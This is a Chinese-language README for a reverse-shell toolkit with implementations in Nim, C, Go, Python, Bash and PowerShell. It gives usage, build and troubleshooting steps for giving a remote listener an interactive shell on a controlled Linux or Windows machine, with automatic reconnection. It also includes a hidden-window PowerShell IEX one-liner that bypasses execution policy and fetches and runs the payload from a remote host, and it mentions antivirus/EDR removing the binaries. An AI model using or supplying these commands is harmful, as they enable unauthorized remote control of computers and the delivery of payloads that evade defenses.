# ReverseShell_Sample

多语言「反弹交互式 Shell」样本集：**监听端用 nc**（Linux / Windows 均可），**受控端支持 Linux / Windows**。

针对现场最常见的两类问题做了系统性修复：

1. **收不到会话** —— 连接超时 + 断线自动重连 + 错误不再静默吞掉（全部走 stderr，前缀 `[reverse]`）
2. **收到会话但不能交互** —— Linux 全部用**真 PTY**；Windows 优先 **ConPTY 真控制台**（Win10 1809+），旧系统自动回退管道模式；监听端提供 raw 模式助手

## 支持矩阵

| 实现 | Linux 受控端 | Windows 受控端 | 交互质量 |
|---|---|---|---|
| `nim/reverse.nim` | ✅ forkpty 真 PTY | ✅ **ConPTY**（旧系统回退管道） | 最高：提示符 / Ctrl-C / su / vim 正常 |
| `c/reverse.c` | ✅ forkpty 真 PTY | ✅ 管道 + 线程 | Linux 同左；Windows 无 Ctrl-C |
| `go/` | ✅ `/dev/ptmx` 真 PTY（纯系统调用） | ✅ 管道 + goroutine | Linux 同左；Windows 无 Ctrl-C |
| `python/reverse.py` | ✅ `pty.spawn` 真 PTY | ✅ 管道 + 线程 | 同上 |
| `bash/shell.sh` | ✅ python → script → tcp 三级自动回退 | — | 前两级为真 PTY；tcp 兜底无 PTY |
| `powershell/reverse.ps1` | — | ✅ 管道 + runspace（PS 5.1 兼容） | 无 Ctrl-C；命令执行可靠 |

> 所有实现默认**断线自动重连**，连接超时 10 秒，TCP keepalive。
> Windows 管道模式（非 ConPTY）不支持 Ctrl-C / 全屏程序，这是系统机制限制；需要完整控制台请用 `nim` 版。

## 快速开始

### 第一步：监听端（先起来再打受控端）

推荐用自带的监听助手（自动处理终端 raw 模式、自动挑 socat / rlwrap / nc）：

```bash
bash tools/listen.sh 4444            # 自动选择；Ctrl-C 会发给对端，退出自动恢复终端
RS_KEEP=1 bash tools/listen.sh 4444  # 保持监听，接多个会话
bash tools/listen.sh 4444 --dry-run  # 只看会执行什么命令
```

手动用 nc 也可以，但**务必进入 raw 模式**，否则 Ctrl-C 会被本地终端吞掉、字也回显不正常：

```bash
stty raw -echo; nc -lvnp 4444; stty sane     # openbsd nc
stty raw -echo; nc -l -p 4444; stty sane     # traditional nc（如 Debian netcat-traditional）
rlwrap -cAr nc -lvnp 4444                     # 有 rlwrap 时（带行编辑，推荐）
socat file:$(tty),raw,echo=0 tcp-listen:4444,reuseaddr   # 最稳，双向 raw
```

Windows 监听端（Nmap ncat）：

```powershell
ncat -lvnp 4444
```

nc 变体速查：openbsd 版用 `-lvnp`，traditional 版用 `-l -p`；
openbsd 版加 `-k` 可连续接收多个连接，traditional 版单次接收。

### 第二步：受控端

所有实现统一约定：

```text
用法:  <程序|脚本> [HOST] [PORT]        # 位置参数优先
```

| 环境变量 | 默认值 | 说明 |
|---|---|---|
| `RS_HOST` | `192.168.56.1` | 监听端 IP |
| `RS_PORT` | `8080` | 监听端端口 |
| `RS_INTERVAL` | `5` | 断线重连间隔（秒） |
| `RS_SHELL` | Linux `bash` / Windows `cmd.exe` | 自定义 shell |
| `RS_SESSIONS` | `0`（无限） | 最多会话数，到数后退出 |
| `RS_ONCE` | – | `=1` 等价 `RS_SESSIONS=1`（适合测试/一次性任务） |
| `RS_NO_CHCP` | – | （Windows）`=1` 不自动发送 `chcp 65001` |

#### Linux 受控端

```bash
./dist/reverse-linux-nim  10.0.0.5 4444
./dist/reverse-linux-c    10.0.0.5 4444
./dist/reverse-linux-go   10.0.0.5 4444
python3 python/reverse.py 10.0.0.5 4444
bash bash/shell.sh        10.0.0.5 4444          # RS_METHOD=python|script|tcp 可强制回退级别
```

#### Windows 受控端

```powershell
.\dist\reverse-windows-nim.exe  10.0.0.5 4444   # ConPTY，推荐
.\dist\reverse-windows-c.exe    10.0.0.5 4444
.\dist\reverse-windows-go.exe   10.0.0.5 4444
py -3 python\reverse.py         10.0.0.5 4444
powershell -NoProfile -ExecutionPolicy Bypass -File powershell\reverse.ps1 -ServerIp 10.0.0.5 -Port 4444
```

PowerShell 版也可无参数加载（读环境变量/默认值），适合 `IEX` 风格投递：

```powershell
$env:RS_HOST='10.0.0.5'; powershell -NoP -W Hidden -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/reverse.ps1')"
```

## 构建

```bash
bash build.sh            # 全部（缺工具链自动跳过）
bash build.sh linux      # 仅 Linux 产物
bash build.sh windows    # 仅 Windows 交叉编译产物（需要 mingw-w64）
```

产物在 `dist/`。手动编译命令：

```bash
# Nim：Linux / Windows 交叉编译
nim c -d:release -o:dist/reverse-linux-nim nim/reverse.nim
nim c -d:release --threads:on --os:windows --cpu:amd64 -d:mingw \
    --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc \
    -o:dist/reverse-windows-nim.exe nim/reverse.nim

# C
make -C c linux && make -C c windows

# Go（无第三方依赖，静态单文件）
cd go && CGO_ENABLED=0 GOOS=linux go build -o ../dist/reverse-linux-go .
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -o ../dist/reverse-windows-go.exe .
```

## 测试

```bash
bash tests/run.sh          # 全量：Linux 真跑 + Windows（WSL interop）真跑 + 真实 nc 冒烟
bash tests/run.sh --quick  # 只跑 Linux 目标
```

测试用 `tests/harness.py` 模拟监听端，逐项断言：连接 / 命令执行 / 真 PTY（`/dev/pts/`） / Ctrl-C 穿透 / 断线重连。
当前在本机（WSL + 交叉编译 + interop）全绿 16/16。

## 排查手册

### A. 受控端连不上（收不到会话）

按顺序排查：

1. **连通性**：受控端能到监听端吗？`ping` 监听端 IP；监听端 `ip a` 确认地址（虚拟机注意网卡模式：NAT / 仅主机 192.168.56.x 各不相同）。
2. **防火墙**：监听端 Linux 的 `iptables/nft`、Windows 防火墙入站规则；企业环境出站也可能被拦。
3. **端口占用/绑定**：`ss -lntp | grep 4444`；用 `-s` 指定监听网卡。
4. **nc 只接一次**：openbsd 版加 `-k`（或 `tools/listen.sh` + `RS_KEEP=1`）保持监听。
5. **参数没生效**：位置参数优先于环境变量；Windows 计划任务/服务/IEX 场景环境变量不一定继承，直接用参数。
6. **看受控端 stderr**：所有实现把连接失败/会话结束写到 stderr（`[reverse]` 前缀）。前台运行一次即可看到；Nim 版加 `RS_DEBUG=1` 有内部状态细节。
7. **别急**：默认每 5 秒重连一次、单次连接超时 10 秒。监听端晚开几分钟也能接回来；一直收不到说明始终没连上（回到第 1 步）。
8. **杀软/EDR**：Windows 上常见产物被删或连接被断。

### B. 收到了但不能交互

| 症状 | 原因 | 处理 |
|---|---|---|
| 没有提示符、看不到输入回显 | 受控端没有真 PTY | Linux 用 nim/c/go/python/bash(python或script法)；Windows 用 nim 版（ConPTY） |
| 能看到提示符，但打字没显示/不生效 | 监听端不是 raw 模式 | `tools/listen.sh`，或 `stty raw -echo; nc ...; stty sane` |
| Ctrl-C 无效，或反而杀掉监听端 | 监听端未 raw，或受控端无 PTY | 两者都要满足；ConPTY 版支持 Ctrl-C，管道模式不支持 |
| `su`/`sudo`/`vim`/`top` 卡住或报错 | 需要 PTY | 同上 |
| 输出延迟、命令要敲两次才出结果 | 旧实现半双工/阻塞读 | 本仓库新实现全部全双工；确认没有用旧产物 |
| 中文乱码 | Windows 代码页 | 默认自动 `chcp 65001`；仍乱码时对照 `RS_NO_CHCP=1` 手动调试 |
| 会话几秒后自己断了 | 连接超时/对端断开 | 默认自动重连；看受控端 stderr 里 `[reverse]` 的退出原因 |

**换行归一说明**（已内置，无需处理）：ConPTY 模式把 LF/CRLF 都转成 CR（控制台 Enter）；管道模式统一为 LF；因此 Linux 端 nc 与 Windows 端 ncat 都能正常下命令。

### C. 其它

- 终端被 raw 模式搞乱：`stty sane` 或 `reset`。
- `RS_DEBUG=1`（Nim 版）：输出 writer/reader 线程与 select 级别细节，排查连接状态用。
- `RS_NO_CONPTY=1`（Nim 版）：强制走管道模式，用于排除 ConPTY 相关环境问题。

## 目录结构

```
├── bash/shell.sh           # Linux：python/script/tcp 三级回退
├── c/                      # C 实现（单文件 + Makefile）
├── go/                     # Go 实现（pty_linux.go / pipes_windows.go）
├── nim/reverse.nim         # 旗舰：Linux forkpty + Windows ConPTY
├── powershell/reverse.ps1  # Windows PowerShell 5.1+
├── python/reverse.py       # 跨平台
├── tests/                  # harness.py + run.sh 集成测试
├── tools/listen.sh         # 监听端助手（raw 模式 + 自动挑工具）
├── build.sh                # 一键构建
└── dist/                   # 构建产物（不入库）
```

## 已知限制

- Windows 管道模式（c / go / python / powershell 的 Windows 路径）无 Ctrl-C，无全屏程序支持——系统机制限制；需要时用 `nim` 版 ConPTY。
- ConPTY 需要 Win10 1809+；更老的系统 Nim 版会自动回退管道模式（stderr 会有一行提示）。
- `bash/shell.sh` 的 `script` / `tcp` 方法连接超时由系统 TCP 栈决定（Linux 默认约 2 分钟），对连接超时有强要求时优先 python 方法或编译型实现。
- Go 版 Linux PTY 使用了 Linux 的 ioctl 常量，仅在 Linux 上编译（macOS 未适配）。
